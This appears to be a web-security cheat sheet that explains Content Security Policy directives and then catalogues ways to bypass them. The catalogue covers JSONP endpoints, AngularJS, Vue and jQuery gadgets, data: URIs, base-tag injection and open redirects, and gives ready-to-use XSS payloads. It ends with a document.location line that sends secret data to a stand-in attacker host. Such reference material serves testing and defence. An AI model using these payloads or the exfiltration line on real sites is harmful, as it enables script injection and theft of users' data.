# Content Security Policy (CSP) overview

Content Security Policy is a mechanism to define which resources can be fetched out or executed by a web page. It lists and describes paths and sources, from which the browser can safely load resources. The resources may include images, frames, javascript and more.

Content Security Policy is implemented via a response header:

```http
Content-Security-policy: default-src 'self'; img-src 'self' allowed-website.com; style-src 'self';
```

or the `meta` element of the HTML page:

```html
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; img-src https://*; child-src 'none';">
```

The browser follows the received policy and actively blocks violations as they are detected.

## How does it work?

CSP works by restricting the origins that active and passive content can be loaded from. It can additionally restrict certain aspects of active content such as the execution of inline javascript, and the use of `eval()`.

### Directives

Resource loading policy is set using directives:

- **script-src** specifies allowed sources for JavaScript. This includes not only URLs loaded directly into the `<script>` elements but also things like inline script event handlers (such as `onclick`) and XSLT stylesheets which can trigger script execution.
- **default-src** defines the policy for fetching resources by default. When fetch directives are absent in the CSP header the browser follows this directive by default. The list of directives that do not follow `default-src`:
    - `base-uri`
    - `form-action`
    - `frame-ancestors`
    - `plugin-types`
    - `report-uri`
    - `sandbox`
- **child-src** defines valid sources for [web workers](https://developer.mozilla.org/en-US/docs/Web/API/Web_Workers_API) and nested browsing contexts loaded using elements such as `<frame>` and `<iframe>`.
- **connect-src** restricts URLs to load using interfaces such as `<a>`, `fetch`, `websocket`, `XMLHttpRequest`.
- **frame-src** specifies valid sources for nested browsing contexts loading using elements such as `<frame>` and `<iframe>`.
- **frame-ancestors** specifies sources that can embed the current page. This directive applies to `<frame>`, `<iframe>`, `<object>`, `<embed>`, and `<applet>` tags. This directive can't be used in `<meta>` tags and applies only to non-HTML resources.
- **img-src** defines allowed sources for loading images on the web page.
- **manifest-src** defines allowed sources of application [manifest](https://developer.mozilla.org/en-US/docs/Web/Manifest) files.
- **media-src** defines allowed sources from where media objects such as `<audio>`, `<video>` and `<track>` can be loaded.
- **object-src** defines allowed sources for the `<object>`, `<embed>` and `<applet>` elements.
- **base-uri** defines allowed URLs that can be loaded using `<base>` element.
- **form-action** lists valid endpoints for submission from `<form>` tags. Whether `form-action` should block redirects after a form submission is debated and browser implementations of this aspect are inconsistent (e.g. Firefox 57 does not block the redirects whereas Chrome 63 does).
- **plugin-types** restricts the set of plugins that can be embedded into a document by limiting the types of resources which can be loaded. Instantiation of an `<embed>`, `<object>` or `<applet>` elements will fail if:
    - the element to load does not declare a valid MIME-type
    - the declared type does not match one of the specified types in the plugin-types directive
    - the fetched resource does not match the declared type
- **upgrade-insecure-requests** instructs browsers to rewrite URL schemes, changing HTTP to HTTPS. This directive can be useful for websites with large numbers of old URLs that need to be rewritten.
- **sandbox** enables a sandbox for the requested resource similar to the `<iframe>` sandbox attribute. It applies restrictions to a page's actions including preventing popups, preventing the execution of plugins and scripts, and enforcing a same-origin policy.

See the full list of directives at [mdn web docs: Content-Security-Policy - Directives](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy#directives).

### Source values

Sources are used to define the value of the directives:

- **&ast;** allows any URL except `data:`, `blob:` and `filesystem:`.
- **&lt;host-source&gt;** Internet host by name or IP address. The URL scheme, port number, and path are optional. Wildcards `*` can be used for subdomains, host addresses, and port numbers, indicating that all legal values of each are valid.
- **&lt;scheme-source&gt;** A scheme such as `http:` or `https:` (the colon is required). The data schemes can be specified as well:
    - `data:` Allows `data:` URLs to be used as a content source.
    - `mediastream:` Allows `mediastream:` URIs to be used as a content source.
    - `blob:` Allows `blob:` URIs to be used as a content source.
    - `filesystem:` Allows `filesystem:` URIs to be used as a content source.
- **self** Refers to the origin from which the protected document is being served, including the same URL scheme and port number.
- **unsafe-eval** Allows the use of `eval()` and other unsafe methods for creating code from strings.
- **unsafe-hashes** Allows enabling specific inline event handlers.
- **unsafe-inline** Allows the use of inline resources, such as inline `<script>` elements, `javascript:` URLs, inline event handlers, and inline `<style>` elements.
- **none** Refers to the empty set; that is, no URLs match.
- **nonce-&lt;base64-value&gt;** An allowlist for specific inline scripts using a cryptographic nonce (number used once). The server must generate a unique nonce value each time it transmits a policy.
- **&lt;hash-algorithm&gt;-&lt;base64-value&gt;** A `sha256`, `sha384` or `sha512` hash of scripts or styles. This value consists of the algorithm used to create the hash followed by a hyphen and the base64-encoded hash of the script or style.

See the full list of directive sources at [mdn web docs: Content-Security-Policy - CSP source values](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/Sources).

## Example

Consider the following Content Security Policy:

```http
Content-Security-Policy: default-src 'self'; script-src https://website.com;
```

The following image will be **allowed** as the image is loading from the same domain i.e. `website.com`:

```html
<img src="assets/images/logo.png">
```

The following script will be **allowed** as the script is loading from the same domain i.e. `website.com`:

```html
<script src="assets/scripts/main.js"></script>
```

The following script will **not-allowed** as the script is trying to load from an undefined domain i.e. `attacker-website.com`:

```html
<script src=https://attacker-website.com/hook.js></script>
```

The following payload will **not-allowed** on the page as inline scripts are blocked by default:

```html
"/><script>alert(1337)</script>
```

The following image will **not-allowed** as the image is loaded from an undefined domain i.e. `attacker-website.com`:

```html
<img src="https://attacker-website.com/image.svg">
```

Since the directive is not defined in the CSP `img-src` is set to `self` and follows `default-src` by default.

# Bypassing techniques

You can use the following online tools to check Content Security Policy:
- [https://csp-evaluator.withgoogle.com/](https://csp-evaluator.withgoogle.com/)
- [https://cspvalidator.org/](https://cspvalidator.org/)

## Allowed CDNs

If `script-src` or `object-src` allows a public CDN by its domain name it is possible to access any data from that CDN, including vulnerable libraries or frameworks.

{% hint style="info" %}
The presence of `unsafe-eval` or `unsafe-inline` sources significantly simplifies the exploitation of a vulnerable library or framework, since it allows directly calling the vulnerable component. Otherwise, it is necessary to find a way to call a vulnerable component.
{% endhint %}

For example, in the snippet below the CSP allows `https://cdnjs.cloudflare.com` and sets `unsafe-eval` in `script-src`. It allows using `AngularJS` to execute arbitrary JavaScript code.

```html
<head>
    <meta http-equiv="Content-Security-Policy" content="script-src 'unsafe-eval' https://cdnjs.cloudflare.com;">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.min.js"></script>
</head>
<body>
    <div ng-app ng-csp>{{$on.constructor('alert(1)')()}}</div>
</body>
```

## Allowed domains that host user contents

If `script-src` or `object-src` allows a domain where everyone can host arbitrary content it is possible to inject arbitrary content.

For example, in the snippet below the CSP allows `https://storage.googleapis.com` in `scripts-src`. It makes possible the uploading of a payload to GCP Cloud Storage and achieving arbitrary JavaScript execution.

```html
<head>
    <meta http-equiv="Content-Security-Policy" content="script-src https://storage.googleapis.com;">
</head>
<body>
    <script src=https://storage.googleapis.com/path/to/malicious/script.js></script>
</body>
```

## data: scheme

If `default-src`, `script-src`, `frame-src` or `object-src` allows the `data:` scheme it is possible to execute arbitrary JavaScript code by injecting a tag.

```html
<head>
    <meta http-equiv="Content-Security-Policy" content="script-src data:;">
</head>
<body>
    <script src=data:text/javascript,alert(1)></script>
    <iframe src='data:text/html,<script defer="true" src="data:text/javascript,alert(1)"></script>'></iframe>
    <iframe srcdoc='<script src="data:text/javascript,alert(1)"></script>'></iframe>
    <!-- Firefox only -->
    <object data="javascript:alert(1)">
</body>
```

## JSONP

JSONP APIs work with the `callback=` parameter, which specifies a function to process the data sent along with it. If there is no function name validation in JSONP, it is possible to inject a custom callback function and execute arbitrary JavaScript code.

JSONP APIs can be used to bypass a Content Security Policy. For example, the following CSP allows script loading from `https://accounts.google.com`. Since `https://accounts.google.com` hosts JSONP endpoints, they can be used to execute arbitrary code.

```html
<head>
    <meta http-equiv="Content-Security-Policy" content="script-src https://accounts.google.com;">
</head>
<body>
    <script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1)"></script>
</body>
```

The exploitation does not require `unsafe-inline` because the JSONP response handler script must be allowed in the CSP to serve legitimate requests.

References:
- [JSONBee](https://github.com/zigoo0/JSONBee) contains ready-to-use JSONP endpoints on different websites.

### Allowed microsoft.com in script-src by [@OctagonNetworks](https://twitter.com/octagonnetworks/status/1652793272161509377)

It is possible to bypass a CSP if it allows `microsoft.com` in `script-src` due to the CSP bypass found in WordPress.

```html
<head>
    <meta http-equiv=Content-Security-Policy content="script-src https://www.microsoft.com;">
</head>
<body>
    <script src=https://www.microsoft.com/en-us/research/wp-json?_jsonp=alert></script>
</body>
```

References:
- [Bypass CSP Using WordPress By Abusing Same Origin Method Execution](https://octagon.net/blog/2022/05/29/bypass-csp-using-wordpress-by-abusing-same-origin-method-execution/)

## Missing or misconfigured base-uri

If `base-uri` is omitted or set to `*` in a Content Security Policy, it is possible to redirect relative URLs to an attacker-controlled website by injecting the `base` element, check out [HTML Injection: base](/Web%20Application/HTML%20Injection/base.md).

```html
<head>
    <meta http-equiv="Content-Security-Policy" content="script-src 'self' 'nonce-secret';">
</head>
<body>
    <base href='https://attacker-website.com'>
    <script nonce=secret src=/script.js></script>
</body>
```

The snippet above uses the `nonce` attribute value without even knowing it.

References:
- [Write up: CSP bypass by base tag injection](https://ctftime.org/writeup/11452)

## Missing default-src, frame-src or object-src

If a Content Security Policy does not contain `default-src`, `frame-src` or `object-src`, it is possible to combine other misconfigurations with tags injection to achieve arbitrary code execution.

For example, it is possible to use `iframe` to bypass restrictions on `script-src`, such as `script-src 'none'`, `script-src 'self'`, `script-src 'nonce-*'` or `script-src 'hash-*'`.

```html
<!-- does not have access to the parent window due to different origin -->
<iframe src="https://attacker-website.com/payload.html"></iframe>
<!-- has access to the parent window thanks to the same origin -->
<!-- requires control over files in the same domain -->
<iframe src="/uploads/payload.html"></iframe>
```

More examples that leverage other CSP misconfigurations to achieve arbitrary code execution:

```html
<!-- Requires the data: scheme in object-src -->
<object data="data:text/html,<script>alert(1)</script>"></object>
<!-- Requires the data: scheme in script-src -->
<iframe srcdoc='<script src="data:text/javascript,alert(1)"></script>'></iframe>
<!-- Requires unsafe-inline in script-src -->
<iframe srcdoc="<script>alert(1)</script>"></iframe>
```

## Nonce reuse

If `nonce` is static or is generated by a weak generator or its value can be guessed at, a policy can be bypassed by using the static `nonce` or guessing the correct `nonce` value.

References:
- [Writeup: Bug Bounty Stories #1: Tale of CSP bypass in an electron app!](https://securitygoat.medium.com/bug-bounty-stories-1-tale-of-csp-bypass-in-an-electron-app-f669f6ecefc9)

## Open redirects to bypass allowed paths

Content Security Policy allows you to specify paths in the required domain, like `https://website.com/foo/bar/` or `https://website.com/foo/bar/lib.js`. However, if a domain in the allowed list has an open redirect, that open redirect can be used to successfully load resources from allowed resources even if a path does not match the path allowed in the policy.

For example, the following policy allows two resources `https://website.com` and `https://partially-trusted-website.com/foo/bar.js`. If `https://website.com` has an open redirect it is possible to load a script from another path at `https://partially-trusted-website.com`.

```html
<head>
    <meta http-equiv="Content-Security-Policy" content="script-src https://website.com https://partially-trusted-website.com/foo/bar.js;">
</head>
<body>
    <script src="https://website.com?redirect=https://partially-trusted-website.com/path/to/malicious/script.js"></script>
</body>
```

## Script gadgets

Script restrictions in a Content Security Policy can be bypassed by interacting with scripts from allowed sources. Scripts may not work securely with data that can be controlled by a user, via DOM clobbering as an example. As a result, it may lead to arbitrary code execution.

{% hint style="info" %}
Script gadgets can be used to bypass CSP even if a nonce-based policy is in use because gadgets are usually allowed to execute JavaScript.
{% endhint %}

For example, the following snippet calls a function in the global scope based on the arguments from markup:

```javascript
var array = document.getElementById('cmd').value.split(',');
window[array[0]].apply(this, array.slice(1));
```

As a result, this snippet can be used to invoke `window.*` functions with arbitrary arguments using the following `input` element:

```html
<input id="cmd" value="alert,1">
```

Another example is the snippet below that passes a value of the `RecaptchaClientUrl-` element to the `src` attribute of the `script` element:

```javascript
var t = document.querySelector("[id^='RecaptchaClientUrl-']").value
      , i = document.querySelector("[id^='RecaptchaClientSecret-']").value
      , n = document.createElement("script");
    n.id = "RecaptchaScript";
    n.src = t + i;
```

So, the following payload can be used to execute arbitrary JavaScript code:

```html
<input id="RecaptchaClientUrl-" value="//attacker-website.com/path/to/script.js" />
```

Check out the articles from the links below to learn more about finding gadgets.

References:
- [PortSwigger: Hunting nonce-based CSP bypasses with dynamic analysis](https://portswigger.net/research/hunting-nonce-based-csp-bypasses-with-dynamic-analysis)
- [PortSwigger: Bypassing CSP via DOM clobbering](https://portswigger.net/research/bypassing-csp-via-dom-clobbering)
- [PortSwigger: Hijacking service workers via DOM Clobbering](https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering)

## Uploading custom files

### Controlling executable files and script-src 'self'

If there is a way to control files with arbitrary extensions to some path in the same domain it might be possible to abuse a CSP that sets `script-src 'self'` and execute arbitrary JavaScript code.

```html
<head>
    <meta http-equiv="Content-Security-Policy" content="script-src 'self';">
</head>
<body>
    <!-- the script.js will be loaded and executed -->
    <script src='/uploads/script.js'></script>
</body>
```

### Controlling executable files and script-src 'nonce' or 'hash'

If there is a way to control files with arbitrary extensions to some path in the same domain it might be possible to bypass `nonce` and `hash` based `script-src` using the `iframe` element (required misconfigured `frame-src`).

```html
<head>
    <meta http-equiv="Content-Security-Policy" content="script-src 'nonce-secret';">
    <!--
    or
    <meta http-equiv="Content-Security-Policy" content="script-src 'sha256-B2yPHKaXnvFWtRChIbabYmUBFZdVfKKXHbWtWidDVF8=';">
    -->
</head>
<body>
    <iframe src="/uploads/script.html"></iframe>
</body>
```

Where `/uploads/script.html` contains a payload:

```html
<script>alert(1)</script>
```

### Controlling text files and script-src 'self'

Most likely an application will restrict uploading files with potentially dangerous extensions like `html` or `js`.

If `X-Content-Type-Options: nosniff` is not active it is possible to use text files as sources for the `script` element. In this case, browsers use MIME-type sniffing to find out the actual content type of a file.

For example, for the policy below, it is possible to use any text files with MIME-types `text/plain`, `text/css`, `javasript/css`, etc. to load a script.

```html
<head>
    <meta http-equiv="Content-Security-Policy" content="script-src 'self';">
</head>
<body>
    <!-- the file.css will be loaded and executed as JavaScript -->
    <script src='file.css'></script>
</body>
```

However, even if `X-Content-Type-Options: nosniff` is active, there are content types that can be used to deliver a payload, check out:
- [PortSwigger Cross-site scripting (XSS) cheat sheet: Content types](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#content-types)

## unsafe-eval

If `script-src` or `default-src` allows `unsafe-eval`, it might be possible to execute arbitrary JavaScript. There are multiple ways to achieve code execution:

1. There is an `eval` expression that receives user-controlled data.
1. A website uses vulnerable frameworks, like jQuery or Angular.js, that can be used to execute any inline scripts.
1. If a Content Security Policy allows loading libraries and frameworks from public CDNs it is possible to use vulnerable libraries and frameworks to execute arbitrary code.

For example, the following CSP allows `https://cdnjs.cloudflare.com` and sets `unsafe-eval` in `script-src`. The payload uses `Angular JS` to execute arbitrary JavaScript code.

```html
<head>
    <meta http-equiv="Content-Security-Policy" content="script-src 'unsafe-eval' https://cdnjs.cloudflare.com;">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.min.js"></script>
</head>
<body>
    <div ng-app ng-csp>{{$on.constructor('alert(1)')()}}</div>
</body>
```

## unsafe-inline

If `default-src`, `script-src`, `frame-src` or `object-src` allows `unsafe-inline` it is possible to execute arbitrary JavaScript code by injecting a tag or using event handlers.

```html
<head>
    <meta http-equiv="Content-Security-Policy" content="script-src 'unsafe-inline';">
</head>
<body>
    <script>alert(1)</script>
    <img src onerror="alert(1)">
    <iframe src="javascript: alert(1)"></iframe>
</body>
```

## Policy injection

Content Security Policy can be generated dynamically based on variables provided by a user. If these variables are not properly validated, it may be possible to inject directives and weaken the policy.

References:
- [Writeup: CSP Injection - CTFZone 2019 Quals - Shop Task](https://blog.blackfan.ru/2019/12/ctfzone-2019-shop.html)
- [PortSwigger: Bypassing CSP with policy injection](https://portswigger.net/research/bypassing-csp-with-policy-injection)
- [Writeup: How to Hack Apple ID](https://zemnmez.medium.com/how-to-hack-apple-id-f3cc9b483a41)

## Wildcards *

Using `*` with `script-src`, `object-src` or `default-src` allows content loading from an unlimited range of sources.

For example, the following CSP allows the direct loading of malicious scripts from arbitrary resources.

```html
<head>
    <meta http-equiv="Content-Security-Policy" content="script-src *;">
</head>
<body>
    <script src=https://attacker-website.com/script.js></script>
</body>
```

# Frameworks and libraries

## AngularJS

AngularJS can be used to bypass the CSP if it is used by the page or if the CSP allows loading from a remote resource.

The following example uses AngularJS events to access the `window` object and escape from a sandbox.

```html
<head>
    <meta http-equiv="Content-Security-Policy" content="script-src https://cdnjs.cloudflare.com;">
    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.5/angular.js"></script>
</head>
<body ng-app ng-csp>
    <input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'">
</body>
```

In the next example, `prototype.js` is used to access the `window` object. In other words, the payload uses `prototype.js` to access the `window` object from `AngularJS`.

```html
<head>
    <meta http-equiv="Content-Security-Policy" content="script-src https://ajax.googleapis.com;">
    <script src=https://ajax.googleapis.com/ajax/libs/angularjs/1.0.1/angular.js></script>
    <script src=https://ajax.googleapis.com/ajax/libs/prototype/1.7.2.0/prototype.js></script>
</head>
<body class="ng-app" ng-csp>
    {{$on.curry.call().alert(1)}}
</body>
```

More AngularJS payloads can be found at (part of the payloads require user interaction or `unsafe-eval` to be set):
- [PortSwigger Cross-site scripting (XSS) cheat sheet: AngularJS CSP bypasses](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#angularjs-csp-bypasses)
- [H5SC Minichallenge 3: "Sh*t, it's CSP!"](https://github.com/cure53/XSSChallengeWiki/wiki/H5SC-Minichallenge-3%3A-%22Sh%2At%2C-it%27s-CSP%21%22)
- [PortSwigger Cross-site scripting (XSS) cheat sheet: AngularJS sandbox escapes reflected](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#angularjs-sandbox-escapes-reflected)
- [PortSwigger Cross-site scripting (XSS) cheat sheet: DOM based AngularJS sandbox escapes](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#dom-based-angularjs-sandbox-escapes)

The following article explains the payload with `prototype.js` and shows how to find similar libraries to escape a sandbox:
- [Huli's blog: Who pollutes your prototype? Find the libs on cdnjs in an automated way](https://blog.huli.tw/2022/09/01/en/angularjs-csp-bypass-cdnjs/)

## Vue.js

Vie.js can be used to bypass a CSP if `unsafe-eval` is set (that is required for runtime template compilation).

```html
<head>
    <meta http-equiv="Content-Security-Policy" content="script-src https://cdn.jsdelivr.net 'nonce-sometoken' 'unsafe-eval';">
    <script src="https://cdn.jsdelivr.net/npm/vue@2.7.14/dist/vue.js"></script>
</head>
<body>
    <div id="app">
        {{_c.constructor`alert(1)`()}} 
    </div>
    <script nonce="sometoken">
        new Vue({
          el: '#app',
          data: {
            message: 'Hello Vue.js!'
          }
        })
    </script>
</body>
```

More Vue.js payloads can be found at:
- [PortSwigger Cross-site scripting (XSS) cheat sheet: VueJS reflected](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#vuejs-reflected)

## jQuery

jQuery of different versions has vulnerabilities that can be used to bypass a CSP.

### nonce and strict-dynamic bypass via $.get in jQuery 2.x

If there is a way to control an URL in `$.get` or `$.post` it is possible to bypass a CSP that sets `nonce` and `strict-dynamic`.

```html
<head>
  <meta http-equiv="Content-Security-Policy" content="script-src 'nonce-secret' 'strict-dynamic'"> 
  <script nonce='secret' src="https://code.jquery.com/jquery-2.2.4.js" ></script>
</head> 
<body>
    <script nonce=secret> 
        $(function() { 
            $.get('data:text/javascript,"use strict"%0d%0aalert(1)');
        });
    </script>
</body>
```

It was patched in jQuery 3.0.0, check out https://github.com/jquery/jquery/issues/2432

### nonce bypass via jQuery templates

jQuery templates can be used to bypass a CSP that sets `nonce` and `unsafe-eval` (that is required for runtime template compilation).

```html
<head>
    <meta http-equiv="Content-Security-Policy" content="script-src 'nonce-secret' 'unsafe-eval';">
    <script nonce=secret src="https://code.jquery.com/jquery-3.1.1.js"></script>
    <script nonce=secret src="http://ajax.microsoft.com/ajax/jquery.templates/beta1/jquery.tmpl.js"></script>
    <script nonce=secret type="text/javascript">
        jQuery(function(){
            $("#x").tmpl([{}])
        });
    </script>
</head>
<body>
    <div id="x">${alert.bind(window)(1)}</div>
</body>
```

### nonce bypass via hijacking handlebar templates

Handlebar templates can be used to bypass a CSP that sets `nonce` and `unsafe-eval` (that is required for runtime template compilation).

```html
<head>
    <meta http-equiv="Content-Security-Policy" content="script-src 'nonce-secret' 'unsafe-eval';">
    <script nonce="secret" src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
    <script nonce="secret" src="https://cdnjs.cloudflare.com/ajax/libs/handlebars.js/1.3.0/handlebars.js"></script>
</head>
<body>
    <script id="csp-template" type="text/x-handlebars-template">
        <script>alert("I am injected via XSS")<{{!}}/script>
    </script>
    <script id="csp-template" type="text/x-handlebars-template">
        <h1>I am legit</h1>
    </script>
    <div id="csp-placeholder"></div>
    <script nonce="secret">
        var cspSource = $("#csp-template").html();
        var cspTemplate = Handlebars.compile(cspSource);
        $("#csp-placeholder").html(cspTemplate());
    </script>
  </body>
</html>
```

# Data exfiltration

## Overwriting document.location

Overwriting `document.location` can be used to send data to an external server even if a CSP restricts the URLs which can be loaded. 

```javascript
document.location = `https://attacker-website.com/callback?q=${secretData}`;
```

## Using the link HTML element

{% embed url="https://0xn3va.gitbook.io/cheat-sheets/web-application/html-injection/link" %}

# References

- [ZN2018: CSP by Ivan Chalykin](https://github.com/0xn3va/cheat-sheets/blob/master/Web%20Application/Content%20Security%20Policy/materials/zn2018-csp-bypass.pdf)
- [csplite.com: Bypass of CSP](https://csplite.com/csp320)
- [W3C: Content Security Policy Level 3](https://www.w3.org/TR/CSP3)
- [Collection of CSP bypasses by Sebastian Lekies (@slekies)](http://sebastian-lekies.de/csp/bypasses.php)
